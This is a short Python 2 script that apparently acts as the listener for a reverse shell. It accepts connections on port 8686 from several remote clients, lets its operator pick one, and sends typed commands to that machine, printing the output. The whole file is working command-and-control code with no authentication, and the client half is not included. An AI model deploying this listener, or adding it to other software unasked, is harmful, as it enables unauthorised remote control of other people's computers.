#-*- coding: utf-8 -*-

import socket
import threading

clientlist = []
cur_client = None

def wait_connect(s):
    global clientlist
    while True:
        if len(clientlist) == 0:
            print 'waiting for connection...\n'
        sock,addr = s.accept()
        print 'new client {} :{} is connected \n'.format(addr[0],addr[1])

        clientlist.append((sock,addr))


def shell_ctrl(socket):
    while True:
        com = raw_input('please input command here:\n')
        print com
        socket.send(com.encode('utf-8'))
        data = socket.recv(1024)
        print data.decode('utf-8')


def select_client():
    global clientlist
    global cur_client

    if(len(clientlist)>0):
        print 'connected clients:\n'

    for i in range(len(clientlist)):
        print '{}->{}'.format(i,clientlist[i][1])

    if len(clientlist)>0:
        while True:
            num = raw_input('please select a client:\n')
            if int(num) >= len(clientlist):
                print 'not correct!'
                break
            else:
                print 'current client is: {}'.format(num)

                break
        cur_client = clientlist[int(num)]
        print '='*20
        print 'client shell from addr:{}'.format(cur_client[1])
        print '='*20

def main():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(('0.0.0.0',8686))
    s.listen(10)
    t = threading.Thread(target=wait_connect,args=(s,))
    t.start()
    while True:
        if len(clientlist)>0:
            select_client()
            shell_ctrl(cur_client[0])



if __name__ == '__main__':

    main()
